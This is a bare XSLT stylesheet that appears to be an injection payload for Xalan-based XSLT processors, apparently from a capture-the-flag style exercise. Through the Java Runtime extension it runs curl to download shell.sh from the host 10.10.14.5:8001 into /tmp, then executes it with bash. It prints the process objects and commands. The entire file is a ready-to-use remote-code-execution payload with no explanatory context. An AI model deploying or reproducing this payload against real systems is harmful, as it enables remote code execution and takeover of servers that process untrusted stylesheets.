<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[curl http://10.10.14.5:8001/shell.sh -o /tmp/shell.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
<xsl:variable name="cmd2"><![CDATA[bash /tmp/shell.sh]]></xsl:variable>
<xsl:variable name="rtObj2" select="rt:getRuntime()"/>
<xsl:variable name="process2" select="rt:exec($rtObj2, $cmd2)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
Process: <xsl:value-of select="$process2"/>
Command: <xsl:value-of select="$cmd2"/>
</root>
</xsl:template>
</xsl:stylesheet>
